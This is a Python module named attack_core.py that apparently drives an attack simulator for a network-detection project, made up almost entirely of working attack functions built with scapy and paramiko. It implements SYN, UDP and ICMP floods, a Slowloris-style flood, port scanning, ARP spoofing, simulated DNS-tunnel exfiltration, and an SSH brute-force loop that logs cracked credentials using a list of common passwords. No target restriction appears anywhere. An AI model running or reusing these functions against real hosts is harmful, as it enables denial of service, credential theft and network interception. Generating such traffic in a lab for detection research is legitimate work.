"""
attack_core.py

Core attack functions WITHOUT GUI - for automation use.
Extracted from attack_simulator.py

Run: Called by simple_attack_runner.py automatically
"""

import os
import threading
import time
from datetime import datetime
import random
import string
import ipaddress
import socket
import base64
from scapy.all import (
    IP, IPv6, TCP, UDP, ARP,
    ICMP, ICMPv6EchoRequest,
    DNS, DNSQR,
    send, sendp, sr1, srp, Ether,
    conf, wrpcap, Raw,
    get_if_list, get_if_addr
)

# Optional imports
try:
    import paramiko
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

conf.verb = 0

# Global stop event
stop_event = threading.Event()

# ----------------------
# Helper Functions
# ----------------------

def is_ipv6(address):
    """Check if address is IPv6"""
    return ":" in address

def create_ip_layer(dst):
    """Create appropriate IP layer"""
    if is_ipv6(dst):
        return IPv6(dst=dst)
    else:
        return IP(dst=dst)

def timestamp():
    return datetime.now().strftime("%Y%m%d_%H%M%S")

def log(msg, level="info"):
    """Simple logging"""
    now = datetime.now().strftime("%H:%M:%S")
    prefix = {
        "error": "✗",
        "success": "✓",
        "warning": "⚠",
        "info": "→"
    }.get(level, "→")
    print(f"[{now}] {prefix} {msg}")

# ----------------------
# ATTACK IMPLEMENTATIONS
# ----------------------

def syn_flood_impl(target, port, intensity, delay, duration, label):
    """SYN Flood Attack"""
    pkts = []
    log(f"SYN Flood -> {target}:{port} | Intensity: {intensity}")

    start_time = time.time()
    total_sent = 0

    while not stop_event.is_set() and (time.time() - start_time) < duration:
        for i in range(intensity):
            if stop_event.is_set():
                break

            src_port = random.randint(1024, 65535)
            pkt = create_ip_layer(target)/TCP(
                sport=src_port, 
                dport=port, 
                flags="S", 
                seq=random.randint(1000, 9000)
            )
            pkts.append(pkt)

            try:
                send(pkt, verbose=0)
                total_sent += 1
            except Exception as e:
                log(f"Error: {e}", "error")

            if total_sent % 50 == 0:
                log(f"Sent {total_sent} packets...")

        time.sleep(delay)

    stop_event.clear()
    log(f"SYN Flood completed: {total_sent} packets", "success")

def udp_flood_impl(target, port, intensity, delay, duration, label):
    """UDP Flood Attack"""
    pkts = []
    log(f"UDP Flood -> {target}:{port}")

    start_time = time.time()
    total_sent = 0

    while not stop_event.is_set() and (time.time() - start_time) < duration:
        for i in range(intensity):
            if stop_event.is_set():
                break

            payload = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(512, 1024)))
            pkt = create_ip_layer(target)/UDP(dport=port)/Raw(load=payload)
            pkts.append(pkt)

            try:
                send(pkt, verbose=0)
                total_sent += 1
            except Exception as e:
                log(f"Error: {e}", "error")

            if total_sent % 50 == 0:
                log(f"Sent {total_sent} packets...")

        time.sleep(delay)

    stop_event.clear()
    log(f"UDP Flood completed: {total_sent} packets", "success")

def icmp_flood_impl(target, intensity, delay, duration, label):
    """ICMP Flood Attack"""
    pkts = []
    ipv6_mode = is_ipv6(target)
    protocol = "ICMPv6" if ipv6_mode else "ICMP"

    log(f"{protocol} Flood -> {target} | Intensity: {intensity}")

    start_time = time.time()
    total_sent = 0

    while not stop_event.is_set() and (time.time() - start_time) < duration:
        for i in range(intensity):
            if stop_event.is_set():
                break

            payload = ''.join(random.choices(string.ascii_letters, k=56))

            if ipv6_mode:
                pkt = IPv6(dst=target)/ICMPv6EchoRequest()/Raw(load=payload)
            else:
                pkt = IP(dst=target)/ICMP()/Raw(load=payload)

            pkts.append(pkt)

            try:
                send(pkt, verbose=0)
                total_sent += 1
            except Exception as e:
                log(f"Error: {e}", "error")

            if total_sent % 100 == 0:
                log(f"Sent {total_sent} packets...")

        time.sleep(delay)

    stop_event.clear()
    log(f"{protocol} Flood completed: {total_sent} packets", "success")

def port_scan_impl(target, ports_list, delay, duration, label):
    """Port Scanning - Generates continuous SYN packets for sniffing"""
    try:
        # Parse ports
        if '-' in ports_list:
            start, end = ports_list.split('-')
            ports = list(range(int(start), int(end) + 1))
        else:
            ports = [int(p.strip()) for p in ports_list.split(",") if p.strip()]
    except:
        log("Invalid ports format.", "error")
        return

    log(f"Port Scan -> {target} | Ports: {len(ports)} | Duration: {duration}s")

    start_time = time.time()
    total_packets = 0
    scan_round = 0

    # Continuous scanning - keep sending until duration expires
    while not stop_event.is_set() and (time.time() - start_time) < duration:
        scan_round += 1
        random.shuffle(ports)

        for p in ports:
            if stop_event.is_set() or (time.time() - start_time) > duration:
                break

            try:
                # Send SYN packet (don't wait for response to maximize packet generation)
                pkt = create_ip_layer(target)/TCP(dport=p, sport=random.randint(40000, 65000), flags="S")
                send(pkt, verbose=0)
                total_packets += 1

                # Also send ACK scan packet for variety
                pkt_ack = create_ip_layer(target)/TCP(dport=p, sport=random.randint(40000, 65000), flags="A")
                send(pkt_ack, verbose=0)
                total_packets += 1

                # Occasionally send FIN scan
                if random.random() < 0.3:
                    pkt_fin = create_ip_layer(target)/TCP(dport=p, sport=random.randint(40000, 65000), flags="F")
                    send(pkt_fin, verbose=0)
                    total_packets += 1

            except Exception as e:
                log(f"Port {p} error: {e}", "error")

            time.sleep(delay)

        if scan_round % 5 == 0:
            log(f"Scan round {scan_round}: {total_packets} packets sent")

    stop_event.clear()
    log(f"Port scan completed: {total_packets} total packets sent in {scan_round} rounds", "success")

def dns_tunnel_impl(target, dns_server_ip, queries_per_sec, duration, label, mirror_to=None):
    """DNS Tunneling - Sends DNS queries to external DNS server IPs
    
    Args:
        target: Unused (kept for API compatibility)
        dns_server_ip: IP address of the DNS server to send queries to
        queries_per_sec: Rate of queries per second
        duration: How long to run
        label: Label for logging
        mirror_to: Optional IP to send a copy of queries to (for cross-device capture)
    """
    log(f"DNS Tunneling -> DNS Server: {dns_server_ip} | Rate: {queries_per_sec} qps")
    if mirror_to:
        log(f"  Mirroring to: {mirror_to} (for sniffer capture)")

    start_time = time.time()
    total_queries = 0

    # Simulate data exfiltration through encoded subdomains
    fake_data = "SensitiveData123ExfilPayload" * 20

    # Generate fake internal domains for variety
    fake_domains = [
        "internal.corp",
        "data.local",
        "exfil.net",
        "tunnel.io"
    ]

    while not stop_event.is_set() and (time.time() - start_time) < duration:
        # Encode chunk as subdomain (simulates data exfiltration)
        chunk_start = (total_queries * 32) % len(fake_data)
        chunk = fake_data[chunk_start:chunk_start + 32]
        encoded = base64.b32encode(chunk.encode()).decode().lower().rstrip('=')

        # Add random padding and pick a fake domain
        padding = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        fake_domain = random.choice(fake_domains)
        tunnel_query = f"{encoded}{padding}.{fake_domain}"

        # Alternate query types
        qtype = random.choice(['A', 'TXT', 'NULL', 'CNAME', 'MX', 'AAAA'])
        qtype_val = {'A': 1, 'TXT': 16, 'NULL': 10, 'CNAME': 5, 'MX': 15, 'AAAA': 28}[qtype]
        
        sport = random.randint(40000, 65000)

        # PACKET 1: Send to the real DNS server
        pkt = create_ip_layer(dns_server_ip)/UDP(sport=sport, dport=53)/DNS(
            rd=1, 
            qd=DNSQR(qname=tunnel_query, qtype=qtype_val)
        )

        try:
            send(pkt, verbose=0)
            total_queries += 1
            
            # PACKET 2: Send copy to mirror IP (Suhibe) for capture
            if mirror_to:
                pkt_mirror = create_ip_layer(mirror_to)/UDP(sport=sport, dport=53)/DNS(
                    rd=1, 
                    qd=DNSQR(qname=tunnel_query, qtype=qtype_val)
                )
                send(pkt_mirror, verbose=0)

            if total_queries % 50 == 0:
                log(f"Sent {total_queries} queries (Type: {qtype})")
        except Exception as e:
            log(f"Error: {e}", "error")

        time.sleep(1.0 / queries_per_sec)

    stop_event.clear()
    log(f"DNS Tunneling completed: {total_queries} queries", "success")

def arp_spoof_impl(target_ip, fake_mac, intensity, duration, label, dst_mac="ff:ff:ff:ff:ff:ff",
                   fake_mac2=None, mac_switch_delay=0):
    """
    ARP Spoofing with proper Ethernet framing.
    
    Parameters:
    - target_ip: IP to spoof
    - fake_mac: First fake MAC address
    - fake_mac2: Second fake MAC (optional) - if provided, alternates between both fake MACs
    - intensity: Packets per burst
    - duration: Total attack duration
    - dst_mac: Destination MAC (broadcast or target's MAC)
    - mac_switch_delay: Seconds to wait before switching to next MAC (0 = immediate)
    
    Window detection patterns:
    - 5s window:  mac_switch_delay=0, rapid flapping for instant detection
    - 30s window: mac_switch_delay=5-10s, medium paced changes
    - 3min window: mac_switch_delay=30-60s, slow gradual changes
    """
    if is_ipv6(target_ip):
        log("ARP not supported for IPv6", "error")
        return

    # Build list of MACs to cycle through
    mac_list = [fake_mac]
    if fake_mac2:
        mac_list.append(fake_mac2)
    
    # Get our own IP address (attacker's IP) for psrc
    try:
        my_ip = get_if_addr(conf.iface)
        if not my_ip or my_ip == '0.0.0.0':
            my_ip = target_ip  # Fallback
    except:
        my_ip = target_ip
    
    log(f"ARP Spoofing -> {target_ip}")
    log(f"  Attacker IP (psrc): {my_ip}")
    log(f"  MACs to use: {mac_list}")
    log(f"  MAC switch delay: {mac_switch_delay}s")
    log(f"  Target MAC: {dst_mac}")

    start_time = time.time()
    total_sent = 0
    current_mac_idx = 0
    last_switch_time = time.time()

    while not stop_event.is_set() and (time.time() - start_time) < duration:
        # Check if it's time to switch MAC
        if mac_switch_delay > 0:
            if (time.time() - last_switch_time) >= mac_switch_delay:
                current_mac_idx = (current_mac_idx + 1) % len(mac_list)
                last_switch_time = time.time()
                log(f"Switched to MAC: {mac_list[current_mac_idx]}")
        
        for i in range(intensity):
            if stop_event.is_set():
                break

            # Get current MAC (or alternate rapidly if no delay)
            if mac_switch_delay == 0:
                # Rapid alternation - switch every packet
                src_mac = mac_list[total_sent % len(mac_list)]
            else:
                # Delayed switching - use current MAC
                src_mac = mac_list[current_mac_idx]
            
            # Create ARP reply - "I am my_ip and my MAC is src_mac"
            ether = Ether(src=src_mac, dst=dst_mac)
            arp = ARP(op=2, hwsrc=src_mac, psrc=my_ip, hwdst=dst_mac, pdst=target_ip)
            pkt = ether / arp

            try:
                sendp(pkt, verbose=0)
                total_sent += 1
            except Exception as e:
                log(f"Error: {e}", "error")

            if total_sent % 50 == 0:
                log(f"Sent {total_sent} ARP packets (using {src_mac})...")

        time.sleep(0.3)

    stop_event.clear()
    log(f"ARP Spoofing completed: {total_sent} packets", "success")

def ssh_brute_force_impl(target, port, usernames, passwords, delay, duration, label):
    """SSH Brute Force - Continuously loops through credentials until duration expires"""
    if not HAS_PARAMIKO:
        log("Paramiko not installed. Using basic TCP simulation.", "warning")
        return brute_force_basic_impl(target, port, len(usernames) * len(passwords), delay, duration, label)

    log(f"SSH Brute Force -> {target}:{port} | Duration: {duration}s")

    start_time = time.time()
    total_attempts = 0
    round_num = 0

    # Continuously loop through credentials until duration expires
    while not stop_event.is_set() and (time.time() - start_time) < duration:
        round_num += 1
        
        for username in usernames:
            if stop_event.is_set() or (time.time() - start_time) >= duration:
                break

            for password in passwords:
                if stop_event.is_set() or (time.time() - start_time) >= duration:
                    break

                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                try:
                    ssh.connect(target, port=port, username=username,
                               password=password, timeout=3,
                               allow_agent=False, look_for_keys=False)
                    log(f"SUCCESS: {username}:{password}", "success")
                    ssh.close()
                except paramiko.AuthenticationException:
                    total_attempts += 1
                    if total_attempts % 20 == 0:
                        log(f"Attempt {total_attempts}: {username}:{password} failed")
                except Exception as e:
                    total_attempts += 1
                    if total_attempts % 20 == 0:
                        log(f"Attempt {total_attempts}: Connection error")
                finally:
                    try:
                        ssh.close()
                    except:
                        pass

                time.sleep(delay)
        
        if round_num % 5 == 0:
            elapsed = int(time.time() - start_time)
            log(f"Round {round_num}: {total_attempts} attempts, {elapsed}s elapsed")

    stop_event.clear()
    log(f"SSH Brute Force completed: {total_attempts} attempts in {round_num} rounds", "success")

def brute_force_basic_impl(target, port, num_attempts, delay, duration, label):
    """HIGH-VOLUME brute force simulation - generates MASSIVE packet volumes"""
    log(f"Brute Force (HIGH VOLUME) -> {target}:{port} | Duration: {duration}s")

    start_time = time.time()
    attempts = 0
    total_packets = 0
    
    # Dramatically increased packet generation
    usernames = ["admin", "root", "user", "test", "guest", "operator", "service", "backup", "mysql", "postgres"]
    passwords = ["password", "123456", "admin", "root", "test", "guest", "P@ssw0rd", "qwerty", "letmein", "welcome"]

    # Simulate continuous login attempts throughout duration
    while not stop_event.is_set() and (time.time() - start_time) < duration:
        
        # BURST MODE: Send 10 parallel connection attempts before any pause
        for burst in range(10):
            if stop_event.is_set() or (time.time() - start_time) >= duration:
                break
                
            src_port = random.randint(40000, 65000)
            seq = random.randint(1000, 50000)
            
            try:
                # === BURST OF PACKETS PER ATTEMPT ===
                
                # 1. Multiple SYN packets (connection flood pattern)
                for _ in range(3):
                    syn_pkt = create_ip_layer(target)/TCP(sport=src_port+random.randint(0,100), dport=port, flags="S", seq=seq+random.randint(0,1000))
                    send(syn_pkt, verbose=0)
                    total_packets += 1
                
                # 2. TCP handshake completion attempts
                ack_pkt = create_ip_layer(target)/TCP(sport=src_port, dport=port, flags="A", seq=seq+1, ack=1)
                send(ack_pkt, verbose=0)
                total_packets += 1
                
                syn_ack = create_ip_layer(target)/TCP(sport=src_port, dport=port, flags="SA", seq=seq+2, ack=2)
                send(syn_ack, verbose=0)
                total_packets += 1
                
                # 3. SSH banner/version exchange (multiple variants)
                for ver in ["SSH-2.0-OpenSSH_8.4", "SSH-2.0-OpenSSH_7.9", "SSH-2.0-PuTTY"]:
                    ver_pkt = create_ip_layer(target)/TCP(sport=src_port, dport=port, flags="PA", seq=seq+10, ack=10)/Raw(load=f"{ver}\r\n".encode())
                    send(ver_pkt, verbose=0)
                    total_packets += 1
                
                # 4. Key Exchange packets (larger payloads)
                for i in range(5):
                    kex_data = bytes([random.randint(0, 255) for _ in range(256)])
                    kex_pkt = create_ip_layer(target)/TCP(sport=src_port, dport=port, flags="PA", seq=seq+100+i*50, ack=100)/Raw(load=kex_data)
                    send(kex_pkt, verbose=0)
                    total_packets += 1
                
                # 5. MANY authentication attempts per connection
                for user in random.sample(usernames, 5):
                    for pwd in random.sample(passwords, 4):
                        # Auth request
                        auth_data = f"\x32{user}\x00{pwd}\x00".encode()
                        auth_pkt = create_ip_layer(target)/TCP(sport=src_port, dport=port, flags="PA", seq=seq+400, ack=400)/Raw(load=auth_data)
                        send(auth_pkt, verbose=0)
                        total_packets += 1
                        
                        # Simulated response/retry
                        retry_pkt = create_ip_layer(target)/TCP(sport=src_port, dport=port, flags="A", seq=seq+450, ack=450)
                        send(retry_pkt, verbose=0)
                        total_packets += 1
                
                # 6. Connection teardown packets
                for flag in ["F", "FA", "R", "RA"]:
                    close_pkt = create_ip_layer(target)/TCP(sport=src_port, dport=port, flags=flag, seq=seq+500)
                    send(close_pkt, verbose=0)
                    total_packets += 1
                
                attempts += 1
                    
            except Exception as e:
                if attempts % 50 == 0:
                    log(f"Error: {e}", "error")
        
        # Progress logging
        if attempts % 50 == 0:
            elapsed = int(time.time() - start_time)
            rate = total_packets / max(1, elapsed)
            log(f"Attempt {attempts}: {total_packets} packets ({rate:.0f} pkt/s)")
        
        # MINIMAL delay between bursts (0.01s = 10ms)
        time.sleep(0.01)

    stop_event.clear()
    elapsed = int(time.time() - start_time)
    log(f"Brute Force completed: {attempts} attempts, {total_packets} packets in {elapsed}s", "success")


def slowloris_impl(target, port, connections, duration, label):
    """HIGH-VOLUME Slowloris using RAW PACKETS - no server needed, massive packet generation"""
    log(f"Slowloris (HIGH VOLUME) -> {target}:{port} | Duration: {duration}s")

    start_time = time.time()
    total_packets = 0
    connection_count = 0
    
    # User agents for variety
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
        "curl/7.68.0"
    ]
    
    # HTTP paths for variety
    paths = ["/", "/index.html", "/api/v1/data", "/login", "/admin", "/wp-admin", "/robots.txt"]
    
    # Continuous packet generation until duration expires
    while not stop_event.is_set() and (time.time() - start_time) < duration:
        
        # Generate bursts of connections
        for burst in range(20):  # 20 "connections" per burst
            if stop_event.is_set() or (time.time() - start_time) >= duration:
                break
                
            src_port = random.randint(40000, 65000)
            seq = random.randint(1000, 50000)
            
            try:
                # === SIMULATED SLOWLORIS CONNECTION (Raw Packets) ===
                
                # 1. TCP SYN (connection request)
                syn_pkt = create_ip_layer(target)/TCP(sport=src_port, dport=port, flags="S", seq=seq)
                send(syn_pkt, verbose=0)
                total_packets += 1
                
                # 2. TCP ACK (simulated handshake completion)
                ack_pkt = create_ip_layer(target)/TCP(sport=src_port, dport=port, flags="A", seq=seq+1, ack=1)
                send(ack_pkt, verbose=0)
                total_packets += 1
                
                # 3. Partial HTTP Request (the slowloris attack pattern)
                path = random.choice(paths)
                partial_http = f"GET {path}?{random.randint(0,9999)} HTTP/1.1\r\n"
                partial_http += f"Host: {target}\r\n"
                partial_http += f"User-Agent: {random.choice(user_agents)}\r\n"
                # Intentionally incomplete - no final \r\n\r\n
                
                http_pkt = create_ip_layer(target)/TCP(sport=src_port, dport=port, flags="PA", seq=seq+1, ack=1)/Raw(load=partial_http.encode())
                send(http_pkt, verbose=0)
                total_packets += 1
                
                # 4. Keep-alive headers (the slowloris signature - multiple partial headers)
                for _ in range(random.randint(3, 8)):
                    header_name = random.choice(["X-a", "X-b", "X-c", "Accept", "Cache-Control", "Connection"])
                    header_value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(10, 50)))
                    keep_alive = f"{header_name}: {header_value}\r\n"
                    
                    ka_pkt = create_ip_layer(target)/TCP(sport=src_port, dport=port, flags="PA", seq=seq+100, ack=100)/Raw(load=keep_alive.encode())
                    send(ka_pkt, verbose=0)
                    total_packets += 1
                
                # 5. Occasional ACK packets to simulate connection maintenance
                for _ in range(2):
                    maint_ack = create_ip_layer(target)/TCP(sport=src_port, dport=port, flags="A", seq=seq+200, ack=200)
                    send(maint_ack, verbose=0)
                    total_packets += 1
                
                connection_count += 1
                
            except Exception as e:
                if connection_count % 100 == 0:
                    log(f"Error: {e}", "error")
        
        # Progress logging
        if connection_count % 100 == 0:
            elapsed = int(time.time() - start_time)
            rate = total_packets / max(1, elapsed)
            log(f"Connections: {connection_count}, Packets: {total_packets} ({rate:.0f} pkt/s)")
        
        # MINIMAL delay between bursts
        time.sleep(0.005)  # 5ms

    stop_event.clear()
    elapsed = int(time.time() - start_time)
    log(f"Slowloris completed: {connection_count} connections, {total_packets} packets in {elapsed}s", "success")

# ----------------------
# Export all functions
# ----------------------

__all__ = [
    'syn_flood_impl',
    'udp_flood_impl',
    'icmp_flood_impl',
    'port_scan_impl',
    'dns_tunnel_impl',
    'arp_spoof_impl',
    'ssh_brute_force_impl',
    'slowloris_impl',
    'stop_event'
]
